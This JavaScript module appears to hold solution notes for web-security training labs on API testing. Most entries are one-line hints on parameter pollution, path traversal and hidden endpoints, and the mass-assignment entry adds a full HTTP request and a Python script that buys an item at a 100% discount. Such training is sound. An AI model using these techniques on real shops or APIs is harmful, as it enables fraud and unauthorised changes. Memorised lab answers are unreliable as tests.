export default {
  'api-testing-lab-exploiting-api-endpoint-using-documentation': {
    note: '`/api` exposes interactive documentation; use the documented `DELETE /api/user/carlos` to solve the lab.'
  },
  'api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string': {
    note: 'The forgot-password endpoint embeds `username` into an internal query; inject `&` to add or override parameters.'
  },
  'api-testing-lab-exploiting-unused-api-endpoint': {
    note: '`PATCH /api/products/1/price` exists but the UI never calls it and the handler omits an auth check.'
  },
  'api-testing-lab-exploiting-mass-assignment-vulnerability': {
    note: 'Checkout binds the whole JSON body; add `chosen_discount` with a 100% percentage to pay nothing.',
    work: {
      hints: [
        'Complete a checkout and inspect the `POST /api/checkout` body. It contains a `chosen_discount` object.',
        'The server merges your JSON into the order model. Fields you add are accepted even if the UI never sends them.',
        'Set `"chosen_discount": {"percentage": 100}` and confirm the order total is zero.'
      ],
      approach:
        'Mass assignment on a checkout model. The discount is normally computed server-side, but the binder accepts a client-supplied object. The request is authorised; the field is not. This is a schema problem, not an authentication problem.',
      request: `POST /api/checkout HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/json
Cookie: session=YOUR-SESSION

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}`,
      tokens: [
        ['POST /api/checkout', 'An authenticated endpoint that creates an order from the JSON body.'],
        ['chosen_discount', 'A legitimate order field, normally computed by the server from a coupon.'],
        ['percentage', 'The sub-field the binder maps directly onto the discount model.'],
        ['100', 'A full discount; the order total becomes zero while the item still ships.'],
        ['chosen_products', 'Keeps the request otherwise valid so the order passes the normal checks.']
      ],
      script: `import sys, requests

host = sys.argv[1]
base = f"https://{host}"
s = requests.Session()
s.post(f"{base}/login", data={"username": "wiener", "password": "peter"}, timeout=20)
s.post(f"{base}/cart", data={"productId": "1", "quantity": "1"}, timeout=20)
r = s.post(f"{base}/api/checkout", json={
    "chosen_discount": {"percentage": 100},
    "chosen_products": [{"product_id": "1", "quantity": 1}]
}, timeout=20)
print(r.status_code, r.text[:200])`
    }
  },
  'api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url': {
    note: 'A username is interpolated into an internal REST path; use `../` and `?` to reach or reshape another endpoint.'
  }
}
